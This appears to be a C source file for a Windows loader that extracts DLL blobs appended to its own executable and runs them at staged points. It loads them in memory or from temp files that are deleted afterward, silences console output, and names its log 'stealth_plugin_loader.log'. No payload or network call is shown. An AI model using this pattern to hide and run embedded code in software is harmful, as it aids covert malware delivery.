#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <stdarg.h>
#include "plugin.h"

// For test builds without OpenSSL available, treat appended plugin blobs as plaintext DLLs.
// Production builds should enable AES-GCM decryption (requires OpenSSL headers/libs).

#ifndef ALLOW_CONSOLE_PRINTS
#define printf(...) ((void)0)
#define fprintf(...) ((void)0)
#define puts(...) ((void)0)
#define putchar(...) ((void)0)
#define perror(...) ((void)0)
#endif

#ifndef PATH_BUF_LEN
#define PATH_BUF_LEN 4096
#endif

#pragma GCC diagnostic push
#pragma GCC diagnostic ignored "-Wformat-truncation"

#ifdef ENABLE_FILE_LOGS
static void write_plugin_log(const char *fmt, ...) {
    char tmp[PATH_BUF_LEN];
    if (!GetTempPathA(PATH_BUF_LEN, tmp)) return;
    char path[PATH_BUF_LEN];
    // write to a dedicated loader log to avoid clobbering plugin-written logs
    snprintf(path, PATH_BUF_LEN, "%sstealth_plugin_loader.log", tmp);
    HANDLE hf = CreateFileA(path, FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) return;
    char buf[512];
    va_list ap; va_start(ap, fmt); vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
    DWORD written = 0; WriteFile(hf, buf, (DWORD)strlen(buf), &written, NULL);
    WriteFile(hf, "\n", 1, &written, NULL);
    CloseHandle(hf);
}
#else
static void write_plugin_log(const char *fmt, ...) { (void)fmt; }
#endif
static void hex_to_bytes_local(const char *hex, unsigned char *bytes, size_t len) {
    if (!hex) return;
    for (size_t i = 0; i < len; i++) {
        char tmp[3] = {0};
        tmp[0] = hex[2*i];
        tmp[1] = hex[2*i + 1];
        unsigned int v = (unsigned int)strtoul(tmp, NULL, 16);
        bytes[i] = (unsigned char)(v & 0xFF);
    }
}

// Find overlay in current module by scanning last 64KB for magic
static unsigned char *find_overlay(size_t *out_size) {
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) return NULL;
    // Get module file path to map and read
    char path[MAX_PATH];
    if (!GetModuleFileNameA(hModule, path, MAX_PATH)) return NULL;
    FILE *f = fopen(path, "rb");
    if (!f) return NULL;
    fseek(f, 0, SEEK_END);
    long sz = ftell(f);
    long scan_size = 65536; // 64KB
    if (sz < scan_size) scan_size = sz;
    long base = sz - scan_size;
    fseek(f, base, SEEK_SET);
    unsigned char *buf = malloc(scan_size);
    if (!buf) { fclose(f); return NULL; }
    if (fread(buf, 1, scan_size, f) != (size_t)scan_size) { free(buf); fclose(f); return NULL; }
    // search for magic from end backwards
    for (long i = scan_size - (long)sizeof(PluginOverlayHeader); i >= 0; i--) {
        if (memcmp(buf + i, PLUGIN_MAGIC, 8) == 0) {
            // found header; compute overlay start in file
            PluginOverlayHeader *hdr = (PluginOverlayHeader *)(buf + i);
            long overlay_start = base + i - hdr->table_offset; // table_offset is offset from overlay start
            // overlay size = file_end - overlay_start
            long overlay_size = sz - overlay_start;
            unsigned char *overlay = malloc(overlay_size);
            if (!overlay) { free(buf); fclose(f); return NULL; }
            fseek(f, overlay_start, SEEK_SET);
            if (fread(overlay, 1, overlay_size, f) != (size_t)overlay_size) { free(overlay); free(buf); fclose(f); return NULL; }
            free(buf);
            fclose(f);
            if (out_size) *out_size = overlay_size;
            return overlay;
        }
    }
    free(buf);
    fclose(f);
    return NULL;
}

// In-memory representation for loaded (parsed) plugin entries.
typedef struct {
    PluginEntry entry;
    unsigned char *blob; // plaintext blob bytes
    uint32_t blob_len;
} loaded_plugin_t;

static loaded_plugin_t *g_plugins = NULL;
static uint32_t g_plugin_count = 0;

static void free_loaded_plugins(void) {
    if (!g_plugins) return;
    for (uint32_t i = 0; i < g_plugin_count; i++) {
        free(g_plugins[i].blob);
    }
    free(g_plugins);
    g_plugins = NULL;
    g_plugin_count = 0;
}

int plugin_loader_init(const char *key_hex) {
    write_plugin_log("plugin_loader_init called (key %s)", key_hex ? "present" : "NULL");
    size_t overlay_size = 0;
    unsigned char *overlay = find_overlay(&overlay_size);
    write_plugin_log("find_overlay -> %u bytes", (unsigned)overlay_size);
    if (!overlay) {
        // For testing, allow loading plugins from a directory specified by PLUGIN_TEST_DIR
        const char *test_dir = getenv("PLUGIN_TEST_DIR");
        if (!test_dir) {
            write_plugin_log("No overlay and no PLUGIN_TEST_DIR set — nothing to load");
            return 1; // no overlay found — not an error
        }
        write_plugin_log("PLUGIN_TEST_DIR=%s — loading plugins from directory for testing", test_dir);
        // Also print to stdout for test harness visibility
        printf("[plugin_loader] PLUGIN_TEST_DIR=%s\n", test_dir);
        // Scan test_dir for *.dll and create in-memory plugin entries
        char pattern[PATH_BUF_LEN];
        snprintf(pattern, PATH_BUF_LEN, "%s\\*.dll", test_dir);
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(pattern, &fd);
        if (hFind == INVALID_HANDLE_VALUE) {
            write_plugin_log("No DLLs found in PLUGIN_TEST_DIR");
            printf("[plugin_loader] No DLLs found in PLUGIN_TEST_DIR\n");
            return 1;
        }
        // allocate a temporary list
        loaded_plugin_t *tmp = NULL;
        uint32_t count = 0;
        do {
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) continue;
            char path[PATH_BUF_LEN];
            snprintf(path, PATH_BUF_LEN, "%s\\%s", test_dir, fd.cFileName);
            FILE *fp = fopen(path, "rb");
            if (!fp) continue;
            fseek(fp, 0, SEEK_END);
            long sz = ftell(fp);
            fseek(fp, 0, SEEK_SET);
            unsigned char *buf = malloc(sz);
            if (!buf) { fclose(fp); continue; }
            if (fread(buf, 1, sz, fp) != (size_t)sz) { free(buf); fclose(fp); continue; }
            fclose(fp);
            tmp = (loaded_plugin_t *)realloc(tmp, sizeof(loaded_plugin_t) * (count + 1));
            memset(&tmp[count], 0, sizeof(loaded_plugin_t));
            strncpy(tmp[count].entry.id, fd.cFileName, sizeof(tmp[count].entry.id)-1);
            tmp[count].entry.blob_offset = 0;
            tmp[count].entry.blob_len = (uint32_t)sz;
            tmp[count].entry.flags = 1;
            tmp[count].entry.stage = PLUGIN_STAGE_POSTLAUNCH;
            tmp[count].entry.order = 0;
            tmp[count].blob = buf;
            tmp[count].blob_len = (uint32_t)sz;
            // read optional meta file
            char meta_path[PATH_BUF_LEN];
            snprintf(meta_path, PATH_BUF_LEN, "%s\\%s.meta", test_dir, fd.cFileName);
            FILE *mf = fopen(meta_path, "r");
            if (mf) {
                char line[128];
                while (fgets(line, sizeof(line), mf)) {
                    int s = -1, o = -1;
                    if (sscanf(line, "stage=%d", &s) == 1) {
                        if (s >= 0 && s <= 4) tmp[count].entry.stage = (uint8_t)s;
                    }
                    if (sscanf(line, "order=%d", &o) == 1) {
                        if (o >= 0 && o <= 65535) tmp[count].entry.order = (uint16_t)o;
                    }
                }
                fclose(mf);
            }
            count++;
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
        if (count == 0) {
            if (tmp) free(tmp);
            printf("[plugin_loader] found no valid DLLs after scanning\n");
            return 1;
        }
        // commit tmp into global g_plugins
        free_loaded_plugins();
        g_plugins = tmp;
        g_plugin_count = count;
        write_plugin_log("Loaded %u plugins from PLUGIN_TEST_DIR", g_plugin_count);
        printf("[plugin_loader] Loaded %u plugins from PLUGIN_TEST_DIR\n", g_plugin_count);
        return 0;
    }

    // parse header at end
    if (overlay_size < sizeof(PluginOverlayHeader)) { free(overlay); return -1; }
    PluginOverlayHeader *hdr = (PluginOverlayHeader *)(overlay + overlay_size - sizeof(PluginOverlayHeader));
    if (memcmp(hdr->magic, PLUGIN_MAGIC, 8) != 0) { free(overlay); return -1; }

    unsigned char *overlay_start = overlay; // overlay buffer starts at overlay[0]
    uint32_t plugin_count = hdr->plugin_count;
    // In the on-disk layout we store header at file-end and table+blobs before it.
    // The loader's find_overlay() computed 'overlay' to start at the table, so entries begin at overlay_start.
    if ((size_t)plugin_count * sizeof(PluginEntry) > overlay_size) { free(overlay); return -1; }
    PluginEntry *entries = (PluginEntry *)(overlay_start);

    unsigned char key[32];
    if (key_hex) hex_to_bytes_local(key_hex, key, 32);

    write_plugin_log("plugin_count=%u", plugin_count);

    // free any previous state
    free_loaded_plugins();
    g_plugins = (loaded_plugin_t *)calloc(plugin_count, sizeof(loaded_plugin_t));
    if (!g_plugins) { free(overlay); return -1; }
    g_plugin_count = plugin_count;

    for (uint32_t i = 0; i < plugin_count; i++) {
        PluginEntry *e = &entries[i];
        write_plugin_log("Parsing plugin entry %u: id='%s' blob_off=%u len=%u flags=%u stage=%u order=%u", i, e->id, e->blob_offset, e->blob_len, e->flags, e->stage, e->order);
        // bounds check
        if ((size_t)e->blob_offset + e->blob_len > overlay_size) {
            write_plugin_log("entry %u out of bounds — skipping", i);
            continue;
        }
        unsigned char *ciphertext = overlay_start + e->blob_offset;
        unsigned char *plaintext = malloc(e->blob_len);
        if (!plaintext) { write_plugin_log("malloc failed for entry %u", i); continue; }

        // Test-mode: appended blobs are written plaintext by the packer; copy directly.
        memcpy(plaintext, ciphertext, e->blob_len);

        // Save parsed entry and blob for later staged execution
        memcpy(&g_plugins[i].entry, e, sizeof(PluginEntry));
        g_plugins[i].blob = plaintext;
        g_plugins[i].blob_len = e->blob_len;
    }

    free(overlay);
    return 0;
}

// Helper to attempt loading a plugin blob (in-memory loader if available, else temp file)
static HMODULE load_blob_as_module(unsigned char *blob, uint32_t len, const char *id) {
    HMODULE h = NULL;
    typedef HMODULE (*LoadDllInMemory_t)(void *, DWORD);
    HMODULE mod = GetModuleHandle(NULL);
    FARPROC pfn = GetProcAddress(mod, "LoadDllInMemory");
    if (pfn) {
        LoadDllInMemory_t loader = (LoadDllInMemory_t)pfn;
        write_plugin_log("Attempting in-memory load of plugin '%s' size=%u", id, len);
        h = loader(blob, (DWORD)len);
        write_plugin_log("In-memory load result for '%s' = %p", id, (void*)h);
        return h;
    }
    // fallback: write to temp file and LoadLibrary
    char tmpPath[MAX_PATH];
    char tmpName[MAX_PATH];
    if (GetTempPathA(MAX_PATH, tmpPath) && GetTempFileNameA(tmpPath, "plg", 0, tmpName)) {
        HANDLE hf = CreateFileA(tmpName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hf != INVALID_HANDLE_VALUE) {
            DWORD written;
            WriteFile(hf, blob, (DWORD)len, &written, NULL);
            CloseHandle(hf);
            write_plugin_log("Wrote temp plugin '%s' (size=%u)", tmpName, len);
            h = LoadLibraryA(tmpName);
            if (h) write_plugin_log("LoadLibrary succeeded for temp '%s' -> %p", tmpName, (void*)h);
            else write_plugin_log("LoadLibrary failed for temp '%s' -> error=%u", tmpName, GetLastError());
            DeleteFileA(tmpName);
        }
    }
    return h;
}

// Compare function for qsort by order
static int cmp_order(const void *a, const void *b) {
    const loaded_plugin_t *pa = *(const loaded_plugin_t **)a;
    const loaded_plugin_t *pb = *(const loaded_plugin_t **)b;
    if (pa->entry.order < pb->entry.order) return -1;
    if (pa->entry.order > pb->entry.order) return 1;
    return 0;
}

int plugin_fire_stage(int stage) {
    if (!g_plugins || g_plugin_count == 0) return 0;
    // collect matches
    loaded_plugin_t **matches = (loaded_plugin_t **)malloc(sizeof(loaded_plugin_t *) * g_plugin_count);
    if (!matches) return 0;
    uint32_t m = 0;
    for (uint32_t i = 0; i < g_plugin_count; i++) {
        if (g_plugins[i].blob && (int)g_plugins[i].entry.stage == stage) {
            matches[m++] = &g_plugins[i];
        }
    }
    if (m == 0) { free(matches); return 0; }
    // sort by order
    qsort(matches, m, sizeof(loaded_plugin_t *), cmp_order);

    int successes = 0;
    for (uint32_t i = 0; i < m; i++) {
        loaded_plugin_t *rp = matches[i];
        write_plugin_log("Firing plugin id='%s' stage=%d order=%u", rp->entry.id, rp->entry.stage, rp->entry.order);
        HMODULE h = load_blob_as_module(rp->blob, rp->blob_len, rp->entry.id);
        if (h) successes++;
    }
    free(matches);
    return successes;
}

#pragma GCC diagnostic pop
